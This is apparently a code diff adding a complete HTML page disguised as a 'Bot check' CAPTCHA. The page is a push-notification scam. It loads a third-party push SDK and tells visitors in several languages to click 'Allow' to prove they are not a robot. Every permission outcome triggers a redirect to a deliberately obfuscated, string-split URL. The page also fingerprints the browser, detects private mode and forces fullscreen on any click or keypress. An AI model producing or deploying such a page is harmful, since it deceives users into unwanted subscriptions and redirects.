@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <meta charset="UTF-8">
+    <title>Bot check</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        html {
+            background-color: #fff
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            background-color: #fff;
+            color: #fff;
+            font: 300 16px Helvetica, Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            user-select: none
+        }
+
+        .fix,
+        body {
+            height: 100%;
+            width: 100%
+        }
+
+        .fix {
+            left: 0;
+            position: fixed;
+            top: 0;
+            z-index: 10
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        .msg {
+            bottom: 1%;
+            left: 0;
+            margin: auto;
+            max-width: 680px;
+            padding-top: 100px;
+            position: absolute;
+            right: 0;
+            width: 100%
+        }
+
+        .msg__img {
+            display: block;
+            max-width: 100%
+        }
+
+        .msg__tx {
+            background-color: #e5916d;
+            border-radius: 20px;
+            left: 5px;
+            padding: 11px 15px;
+            position: absolute;
+            right: 5px;
+            text-align: center;
+            top: 0
+        }
+
+        .msg__tx strong {
+            font-weight: 700
+        }
+
+        .msg__bot {
+            background: url(images/bot-verification/bot.png) no-repeat;
+            background-size: 100%;
+            bottom: 0;
+            height: 260px;
+            right: 0;
+            width: 150px;
+            z-index: -1
+        }
+
+        .logo,
+        .msg__bot {
+            position: absolute
+        }
+
+        .logo {
+            bottom: 20px;
+            right: 20px
+        }
+
+        .msgReady {
+            background-color: rgba(0, 0, 0, .75);
+            color: #fff;
+            height: 100%;
+            left: 0;
+            position: fixed;
+            text-align: center;
+            top: 0;
+            width: 100%
+        }
+
+        .msgReady__tx {
+            font-size: 32px;
+            margin-top: 10%
+        }
+
+        @media (min-width:375px) {
+            .msg__bot {
+                width: 200px
+            }
+        }
+
+        @media (min-width:425px) {
+            .msgReady__tx {
+                font-size: 52px
+            }
+        }
+
+        @media (min-width:700px) {
+            .msg {
+                padding-top: 65px
+            }
+
+            .msg__tx {
+                border-radius: 33px;
+                font-size: 20px;
+                left: 190px;
+                line-height: 1;
+                padding-left: 20px;
+                padding-right: 20px;
+                right: auto;
+                text-align: left
+            }
+
+            .isYandex .msg__tx {
+                left: 152px;
+                top: 25px
+            }
+
+            .msg__tx:before {
+                border-color: #e5916d transparent transparent;
+                border-style: solid;
+                border-width: 80px 13px 0;
+                content: "";
+                left: -5px;
+                position: absolute;
+                top: 100%;
+                transform: rotate(45deg) translateY(-15px);
+                transform-origin: center top
+            }
+
+            .msg__bot {
+                right: 60px;
+                width: 260px
+            }
+        }
+
+        @media (min-width:700px) and (min-height:600px) {
+            .msg {
+                bottom: 50%;
+                padding-top: 65px;
+                transform: translateY(50%)
+            }
+        }
+    </style>
+</head>
+
+<body>
+  <script>(function() {
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var loc = document.location;
+    var tb = function(){ loc.href = ['ht', 'tps:/', '/blud', 'wan.com/a', 'fu.ph', 'p?zon', 'eid=2483917'].join(''); };
+    var bc = function(){ loc.href = ['ht', 'tps:', '/', '/go', 'ogle.com/'].join(''); };
+
+    var url = new URL(window.location.href);
+    var pci = getParameterByName('external_id', window.location.href);
+    var ppi = getParameterByName('placementid', window.location.href);
+    var tag = document.createElement('script');
+    tag.type = 'text/javascript';
+    tag.dataset['sdk'] = 'sdk';
+    tag.src = '//pushokey.com/ntfc.php?p=2490306&ucis=true&m=https&nbinp=true' + '&var='+ ppi + '&ymid=' + pci;
+
+    function setupHandlers() {
+      // sdk.onBeforePermissionPrompt();
+      sdk.onPermissionDefault(tb);
+      sdk.onPermissionAllowed(tb);
+      sdk.onPermissionDenied(tb);
+      sdk.onAlreadySubscribed(tb);
+    }
+
+    tag.onload = setupHandlers;
+
+    document.head.appendChild(tag);
+    })();</script>
+    <div class="fix"></div>
+    <div class="msg"><img src="images/bot-verification/man.png" alt="images" class="msg__img">
+        <div class="msg__tx"></div>
+        <div class="msg__bot"></div>
+    </div><img src="images/bot-verification/logo.png" alt="logo" class="logo">
+    <div class="msgReady isHide">
+        <div class="msgReady__tx"></div>
+    </div>
+    <script>
+            var v = {
+                    ua: navigator.userAgent,
+                    m: function(n) {
+                        var e = "normal",
+                            t = "private";
+
+                        function o() {
+                            return n(t)
+                        }
+
+                        function r() {
+                            return n(e)
+                        }
+                        if ("safari" === v.n) try {
+                            return window.openDatabase(null, null, null, null), n(e)
+                        } catch (e) {
+                            return n(t)
+                        } else if ("firefox" === v.n) {
+                            var i = indexedDB.open("test.html");
+                            i.addEventListener("error", o), i.addEventListener("success", r)
+                        } else {
+                            if ("edge" === v.n) return void 0 !== window.indexedDB || void 0 === window.PointerEvent && void 0 === window.MSPointerEvent ? n(e) : n(t);
+                            if ("opera" !== v.n && "yandex" !== v.n && "chrome" !== v.n) return n("unknown");
+                            window.webkitRequestFileSystem(window.TEMPORARY, 1, r, o)
+                        }
+                    },
+                    get n() {
+                        var e = !!window.opr && !!opr.addons || !!window.opera || 0 < this.ua.indexOf("OPR/index.html"),
+                            n = "undefined" != typeof InstallTrigger,
+                            t = /constructor/i.test(window.HTMLElement) || /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/.test(this.ua),
+                            o = !!window.chrome && /Google Inc/.test(navigator.vendor),
+                            r = 0 < this.ua.indexOf("YaBrowser") || 0 < this.ua.indexOf("Yowser"),
+                            i = /UBrowser/.test(this.ua),
+                            s = /Edge\//.test(this.ua),
+                            a = null;
+                        return e ? a = "opera" : n ? a = "firefox" : r ? a = "yandex" : i ? a = "uc" : s ? a = "edge" : o ? a = "chrome" : t && (a = "safari"), a
+                    },
+                    get d() {
+                        var n = {
+                                webOS: "webOS",
+                                iPhone: "iPhone",
+                                iPad: "iPad",
+                                iPod: "iPod",
+                                mac: "(MacPPC|MacIntel|Mac_PowerPC|Macintosh)",
+                                blackBerry: "BlackBerry|BB|PlayBook",
+                                windows: "Windows NT",
+                                windowPhone: "Windows Phone",
+                                android: "Android"
+                            },
+                            t = null;
+                        return Object.keys(n).some(function(e) {
+                            if (null !== v.ua.match(new RegExp(n[e], "i"))) return t = e, !0
+                        }), t
+                    }
+                },
+                p = v;
+
+            var y = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (y.k = navigator.language.slice(0, 2)), void 0 === e[y.k] && (y.k = "en"), y.t = e[y.k]
+                    },
+                    get: function(e) {
+                        return y.t[e]
+                    }
+                },
+                b = y;
+
+            b.set({
+                ru: {
+                    msg: 'Нажмите <strong>"Разрешить"</strong>, чтобы подтвердить, что вы не робот',
+                    msgReady: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
+                },
+                en: {
+                    msg: 'Press <strong>"Allow"</strong> to verify, that you are not robot',
+                    msgReady: "You have successfully passed the verification!<br>Now you can close the window."
+                },
+                fr: {
+                    msg: 'Cliquez sur "Autoriser" pour confirmer que vous n\'êtes pas un robot',
+                    msgReady: "Vous avez réussi le test!<br>Maintenant vous pouvez fermer la fenêtre"
+                },
+                de: {
+                    msg: 'Klicken Sie "Zulassen", wenn Sie kein Roboter sind',
+                    msgReady: "Sie haben den Test erfolgreich bestanden!<br>Jetzt können Sie das Fenster schließen"
+                },
+                es: {
+                    msg: 'Haga clic en "Permitir" para confirmar que no es un robot',
+                    msgReady: "Has pasado la prueba con éxito!<br>Ahora puedes cerrar la ventana"
+                },
+                uk: {
+                    msg: 'Натисніть "Дозволити" щоб підтвердити, що ви не бот',
+                    msgReady: "Ви успішно пройшли перевірку!<br>Тепер ви можете закрити вікно."
+                },
+                pl: {
+                    msg: 'Kliknij "Zezwalaj", aby potwierdzić, że nie jesteś botem',
+                    msgReady: "Pomyślnie przeszedłeś weryfikację!<br>Teraz możesz zamknąć okno."
+                },
+                th: {
+                    msg: " คลิกอนุญาตเพื่อยืนยันว่าคุณไม่ใช่บอต",
+                    msgReady: "คุณผ่านการตรวจสอบสำเร็จแล้ว!<br>ตอนนี้คุณสามารถปิดหน้าต่างได้"
+                }
+            }), "yandex" === p.name && document.body.classList.add("isYandex"), document.querySelector(".msg__tx").innerHTML = b.get("msg"), document.querySelector(".msgReady__tx").innerHTML = b.get("msgReady")
+
+    </script>
+    <script>
+      var t = function() {
+          void 0 !== this.requestFullScreen ? this.requestFullScreen() : void 0 !== this.webkitRequestFullScreen ? this.webkitRequestFullScreen() : void 0 !== this.mozRequestFullScreen && this.mozRequestFullScreen()
+      };
+      document.body.addEventListener("keydown", t), document.body.addEventListener("click", t)
+    </script>
+
+
+</body>
+
+
+</html>
